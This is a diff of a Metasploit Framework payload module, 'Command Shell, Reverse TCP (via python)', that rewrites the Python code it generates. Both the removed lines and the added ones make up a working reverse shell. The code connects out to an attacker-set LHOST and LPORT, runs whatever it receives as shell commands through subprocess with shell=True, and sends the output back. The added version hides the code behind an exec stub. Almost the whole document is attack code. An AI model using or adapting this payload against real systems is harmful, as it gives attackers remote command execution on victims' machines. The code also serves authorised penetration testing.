@@ -3,21 +3,19 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 401
+  CachedSize = 461
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(merge_info(info,
       'Name'          => 'Command Shell, Reverse TCP (via python)',
-      'Description'   => 'Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3',
+      'Description'   => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.',
       'Author'        => 'Ben Campbell', # Based on RageLtMan's reverse_ssl
       'License'       => MSF_LICENSE,
       'Platform'      => 'python',
@@ -44,25 +42,21 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    cmd = ''
-    dead = Rex::Text.rand_text_alpha(2)
-    # Set up the socket
-    cmd << "import socket,os\n"
-    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-    cmd << "so.connect(('#{datastore['LHOST']}',#{ datastore['LPORT']}))\n"
-    # The actual IO
-    cmd << "#{dead}=False\n"
-    cmd << "while not #{dead}:\n"
-    cmd << "\tdata=so.recv(1024)\n"
-    cmd << "\tif len(data)==0:\n\t\t#{dead}=True\n"
-    cmd << "\tstdin,stdout,stderr,=os.popen3(data)\n"
-    cmd << "\tstdout_value=stdout.read()+stderr.read()\n"
-    cmd << "\tso.send(stdout_value)\n"
+    cmd = <<~PYTHON
+      import socket as s
+      import subprocess as r
+      so=s.socket(s.AF_INET,s.SOCK_STREAM)
+      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
+      while True:
+      	d=so.recv(1024)
+      	if len(d)==0:
+      		break
+      	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
+      	o=p.stdout.read()+p.stderr.read()
+      	so.send(o)
+    PYTHON
 
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-
-    cmd
+    py_create_exec_stub(cmd)
   end
 end
 
